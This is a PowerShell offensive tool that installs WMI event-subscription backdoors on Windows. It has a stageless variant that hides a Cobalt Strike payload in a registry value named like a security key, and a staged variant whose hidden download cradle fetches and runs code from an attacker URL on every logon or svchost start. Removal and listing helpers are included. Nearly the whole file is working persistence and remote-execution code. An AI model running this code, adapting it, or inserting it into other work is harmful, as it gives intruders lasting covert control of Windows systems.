# Note: This implemenation of a WMI backdoor was heavily based on the code from https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Persistence/Persistence.psm1 and https://raw.githubusercontent.com/xorrior/RandomPS-Scripts/master/WMIBackdoor.ps1
# 
# Note: In order to use the Install-WMIBackdoorRegStageless command, you must first create a fully staged powershell payload.
#   To create this using Cobalt Strike, go to Attacks -> Packages -> Windows Executable (S) -> Powershell.  And save to /root/beacon.ps1
#   Then run:   base64 -w 0 /root/beacon.ps1 | xclip -selection clip     And copy the content to the $fullyStagedPayload variable below.
$fullyStagedPayload = "U2V0LV..."

function Install-WMIBackdoorRegStageless
{
    <#
    .SYNOPSIS
    Adds a stageless payload backdoor using WMI event subscriptions.  Fully Staged Payload will be stored in a registry key.
    This payload will be when any user interactively logs into the host and whenever the process svchost.exe starts.

    .PARAMETER Name
    The name to use for the Event Filter and Consumer.  This name will need to be used later to remove the backdoor.

    .PARAMETER RegPath
    This parameter allows you to specify the registry value to store payload.
    Note: It is recommended that you use a value located in HKU:S-1-5-18, HKU:S-1-5-19, or HKU:S-1-5-20 for best reliability.
    Storing payload in HKLM or HKCU hives may result in payload not being saved if the user has logged out before perstance function is run.
    Default: HKU:S-1-5-18\Software\Microsoft\Windows\SecurityKey

    .PARAMETER Interval
    Interval to be used for how often to send notifications for events (In seconds).  It is recommended to avoid using small intervals. 
    Default: 300

    .EXAMPLE
    Add-WMIBackdoorRegStageless -Name "evilBackdoor"
    Add-WMIBackdoorRegStageless -Name "evilBackdoor" -RegPath "HKLM:Software\Microsoft\MSDTC\SecurityKey"
    Add-WMIBackdoorRegStageless -Name "evilBackdoor" -Interval 30
    #>


    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$True, Position=0)]
        [string]
        $Name,

        [Parameter(Mandatory=$False)]
        [string]
        $RegPath = "HKU:S-1-5-18\Software\Microsoft\Windows\SecurityKey",

        [Parameter(Mandatory=$False)]
        [int]
        $Interval=300
    )

    Sanity-Check

    # Store Payload in Registry Value
    $hiveInt, $path, $regName = Parse-RegPath($RegPath)
    $registry = [WMIClass] "\root\default:StdRegProv"

    [Void] $registry.SetStringValue($hiveInt, $path, $regName, $fullyStagedPayload)

    if ($registry.GetStringValue($hiveInt, $path, $regName).sValue -eq $fullyStagedPayload)
    {
        Write-Output "Payload Stored in Registry Value:"
        $hive = $RegPath.substring(0, $RegPath.IndexOf(':'))
        Write-Output "$hive`:$path\$regName"
        
    }
    else
    {
        Write-Output "Unable to store payload in Registry, tried value:"
        $hive = $RegPath.substring(0, $RegPath.IndexOf(':'))
        Write-Output "$hive`:$path\$regName"
    }

    #Build the Query
    $Query = "SELECT * FROM __InstanceCreationEvent WITHIN $Interval WHERE (TargetInstance ISA 'Win32_Process' AND TargetInstance.Name = 'svchost.exe') OR (TargetInstance ISA 'Win32_LogonSession' AND (TargetInstance.LogonType = 2 OR TargetInstance.LogonType = 11))"

    #Build the filter
    $NS = "root\subscription"
    $FilterArgs = @{
        Name=$Name
        EventNameSpace="root\cimv2"
        QueryLanguage="WQL"
        Query=$Query
    }
    $Filter = Set-WmiInstance -Namespace $NS -Class "__EventFilter" -Arguments $FilterArgs
    Write-Output "$Name Filter Created"
    
    #Build the Consumer   
    $ConsumerName = $Name

    $command = "IEX ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String( ([WMIClass] `"\root\default:StdRegProv`").GetStringValue(`"$hiveInt`", `"$path`", `"$regName`").sValue )))"
    
    $tempBytes = [System.Text.Encoding]::Unicode.GetBytes($command)
    $command = [Convert]::ToBase64String($tempBytes)

    if (Test-Path "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe")
    {
        $PowershellPath = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
    }
    else
    {
        Write-Error "Unable to locate powershell.exe.  WMI Consumer not created.  Recommend running Remove-WmiBackdoor to clean up artifacts."
        exit
    }

    $commandLine = "$PowershellPath -NoP -NonI -w hidden -Enc $command"

    $ConsumerArgs = @{
        Name=$ConsumerName
        CommandLineTemplate=$commandLine
    }

    $consumer = Set-WmiInstance -Class "CommandLineEventConsumer" -Namespace $NS -Arguments $ConsumerArgs
    Write-Output "$Name Consumer Created"

    #Bind filter and consumer    
    $Args = @{
       Filter = $Filter
       Consumer = $consumer
    }

    [Void] (Set-WmiInstance -Class "__FilterToConsumerBinding" -Namespace "root\subscription" -Arguments $Args)
    Write-Output "$Name Binding Created"          
}

function Install-WMIBackdoorStagedURL
{
    <#
    .SYNOPSIS
    Adds a URL Web Delievery backdoor using WMI event subscriptions.  This command will be executed approximately 3 minutes after boot AND when any user interactively logs into the host.

    .PARAMETER URL
    The URL for the powershell download cradle.

    .PARAMETER Name
    The name to use for the Event Filter and Consumer.  This name will be used later to remove the backdoor.

    .PARAMETER Interval
    Interval used for how often to check for events (in seconds). 
    Default: 300

    .EXAMPLE
    Install-WMIBackdoorStagedURL -URL "http://172.20.200.113/evilPayload" -Name "evilBackdoor"
    #>

    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$True)]
        [string]$URL,

        [Parameter(Mandatory=$True)]
        [string]$Name,

        [Parameter(Mandatory=$False)]
        [int]$Interval=300
    )

    Sanity-Check
    
    #Build the Query 
    #$Query = "SELECT * FROM __InstanceCreationEvent WITHIN $Interval WHERE TargetInstance ISA 'Win32_LogonSession' AND (TargetInstance.LogonType = 2 OR TargetInstance.LogonType = 11)"
    $Query = "SELECT * FROM __InstanceCreationEvent WITHIN $Interval WHERE (TargetInstance ISA 'Win32_Process' AND TargetInstance.Name = 'svchost.exe') OR (TargetInstance ISA 'Win32_LogonSession' AND (TargetInstance.LogonType = 2 OR TargetInstance.LogonType = 11))"
    
    #Build the filter
    $NS = "root\subscription"
    $FilterArgs = @{
        Name=$Name
        EventNameSpace="root\cimv2"
        QueryLanguage="WQL"
        Query=$Query
    }
    $Filter = Set-WmiInstance -Namespace $NS -Class "__EventFilter" -Arguments $FilterArgs
    Write-Output "$Name Filter Created"
    
    #Build the Consumer   
    $ConsumerName = $Name

    #$command = "IEX ((new-object net.webclient).downloadstring('$URL'))"
    $command = "`$wc = New-Object System.net.Webclient; `$wc.Headers.Add('User-Agent','Mozilla/5.0 (Windows NT 6.1; WOW64;Trident/7.0; AS; rv:11.0) Like Gecko'); `$wc.proxy= [System.Net.WebRequest]::DefaultWebProxy; `$wc.proxy.credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials; `$update = `$wc.downloadstring('$URL'); IEX `$update"
    
    $tempBytes = [System.Text.Encoding]::Unicode.GetBytes($command)
    $command = [Convert]::ToBase64String($tempBytes)
    
    if (Test-Path "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe")
    {
        $PowershellPath = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
    }
    else
    {
        Write-Error "Unable to locate powershell.exe.  WMI Consumer not created.  Recommend running Remove-WmiBackdoor to clean up artifacts."
        Return 0
    }

    $commandLine = "$PowershellPath -NoP -NonI -w hidden -Enc $command"

    $ConsumerArgs = @{
        Name=$ConsumerName
        CommandLineTemplate=$commandLine
    }

    $consumer = Set-WmiInstance -Class "CommandLineEventConsumer" -Namespace $NS -Arguments $ConsumerArgs
    Write-Output "$Name Consumer Created"

    #Bind filter and consumer    
    $Args = @{
       Filter = $Filter
       Consumer = $consumer
    }

    [Void] (Set-WmiInstance -Class "__FilterToConsumerBinding" -Namespace "root\subscription" -Arguments $Args)
    Write-Output "$Name Binding Created"
}

function Sanity-Check
{
    $duplicate = $false

    if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))
    {
        Write-Output "ERROR: This command requires Administrative Context.  Exiting now..."
        exit
    }

    # Verify that WMI Event doesn't already exist
        
    # Check if Binding already exists with that Name 
    if(Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding | Where-Object {$_.Consumer -like "*$Name*"})
    {
        Write-Output "ERROR: WMI Binding already exsists with name: $Name"
        $duplicate = $true
    }

    # Check if Filter already exists with that Name
    if(Get-WmiObject -Namespace root\subscription -Class __EventFilter | Where-Object {$_.Name -eq "$Name"})
    {
        Write-Output "ERROR: WMI Filter already exsists with name: $Name"
        $duplicate = $true
    }

    # Check if Consumer already exists with that Name
    if(Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer | Where-Object {$_.Name -eq "$Name"})
    {
        Write-Output "ERROR: WMI Consumer already exsists with name: $Name"
        $duplicate = $true
    }

    if ($duplicate) 
    {
        write-output "Please choose a unique Name for WMI backdoor"
        exit
    }
}

function Parse-RegPath ($fullRegPath) 
{
    $hive = $fullRegPath.Substring(0, $fullRegPath.IndexOf(":"))
    $tempRegPath = $fullRegPath.Substring($fullRegPath.IndexOf(":")+1)
    $regSeperator = $tempRegPath.LastIndexOf("\")
    
    $regPath = $tempRegPath.SubString(0, $regSeperator)
    $regKey = $tempRegPath.SubString($regSeperator+1)

    if ($hive -eq "HKCU")
    {
        $hiveInt = [UInt32] "0x80000001"
    }
    elseif ($hive -eq "HKLM")
    {
        $hiveInt = [UInt32] "0x80000002"
    }
    elseif ($hive -eq "HKU")
    {
        $hiveInt = [UInt32] "0x80000003"
    }
    else
    {
        Write-Output "Could not identify Hive, please use HKCU, HKLM, or HKU"
        exit
    }
    
    return $hiveInt, $regPath, $regKey
}

function Remove-WmiBackdoor
{
    <#
    .SYNOPSIS
    Removes the WMI backdoor created by either the Install-WMIBackdoorRegStageless or Install-WMIBackdoorStagedURL functions.
    Note: If backdoor was created with Install-WMIBackdoorRegStageless, then you MUST use -RegPath to specify registry location where payload is stored.

    .PARAMETER Name
    The name previously used to add the WMI backdoor

    .PARAMETER RegPath
    The Registry Key to store the fully staged powershell payload.

    .EXAMPLE
    Remove-WmiBackdoor -Name "evilBackdoor"
    Remove-WmiBackdoor -Name "evilBackdoor" -RegPath "HKU:S-1-5-18\Software\Microsoft\Windows\SecurityKey"
    #>

    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$True, Position=0)]
        [string]$Name,

        [Parameter(Mandatory=$False)]
        [string]$RegPath = $null
    )


    $ns = "root\subscription"
    $Binding = "__FilterToConsumerBinding"
    $Filter = "__EventFilter"
    $Consumer = "CommandLineEventConsumer"

    # Remove the Registry Key
    if ($RegPath)
    {
        $hiveInt, $path, $regName = Parse-RegPath($regPath)
        $registry = [WMIClass] "\root\default:StdRegProv"

        # check if Registry Value exists and delete it
        if ($registry.GetStringValue($hiveInt, $path, $regName).ReturnValue -eq 0)
        {
            [void]$registry.DeleteValue($hiveInt, $path, $regName)
            # Make sure Registry Value was removed
            if ($registry.GetStringValue($hiveInt, $path, $regName).ReturnValue -ne 0)
            {
                Write-Output "Registry Key has been removed"
            }
            else
            {
                Write-Output "Warning: Unable to remove Registry Value with name:"
                Write-Output $RegPath
            }
        }
        else
        {
            Write-Output "Warning: Registry Value does not exist with name:"
            Write-Output $RegPath
        }
    }
    else
    {
        Write-Output "Warning: No Registry Value was specified to remove."
    }

    #Remove the binding
    if(Get-WmiObject -Namespace $ns -Class $Binding | Where-Object {$_.Consumer -like "*$Name*"})
    {
        try
        {
            Get-WmiObject -Namespace $ns -Class $Binding | Where-Object {$_.Consumer -like "*$Name*"} | Remove-WmiObject
            Write-Output "$Name Binding has been removed"
        }
        catch
        {
            Write-Warning "Unable to remove FilterToConsumerBinding with the name: $Name"
            write-output $_
        }
    }
    else
    {
        Write-Warning "Unable to find FilterToConsumerBinding with the name: $Name"
    }

    #Remove the filter
    if(Get-WmiObject -Namespace $ns -Class $Filter | Where-Object {$_.Name -eq "$Name"})
    {
        try
        {
            Get-WmiObject -Namespace $ns -Class $Filter | Where-Object {$_.Name -eq "$Name"} | Remove-WmiObject
            Write-Output "$Name Filter has been removed"    
        }
        catch
        {
            Write-Warning "Unable to remove Event Filter with the Name: $Name"
            Write-Output $_
        }
    }
    else
    {
        Write-Warning "Unable to find Event Filter with the name: $Name"
    }

    #Remove the Consumer
    if(Get-WmiObject -Namespace $ns -Class $Consumer | Where-Object {$_.Name -eq "$Name"})
    {
        try
        {
            Get-WmiObject -Namespace $ns -Class $Consumer | Where-Object {$_.Name -eq "$Name"} | Remove-WmiObject
            Write-Output "$Name Consumer has been removed"    
        }
        catch
        {
            Write-Warning "Unable to remove Consumer with the Name: $Name"
            Write-Output $_
        }
    }
    else
    {
        Write-Warning "Unable to find Consumer with the name: $Name"
    }
}


function List-WmiEvents {
    <#
    .SYNOPSIS
        This function will List all WMI Event Subscriptions in the __EventFilter and CommandLineEventConsumer Classes.
        Useful when removing the backdoor if you forgot what it was named.

    .EXAMPLE
        List-WmiEvents
    #>

    Get-WmiObject -Namespace root\subscription -Class __EventFilter|select Name,Query | ft -autosize -wrap
    Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer|select name,CommandLineTemplate |  ft -autosize -wrap
}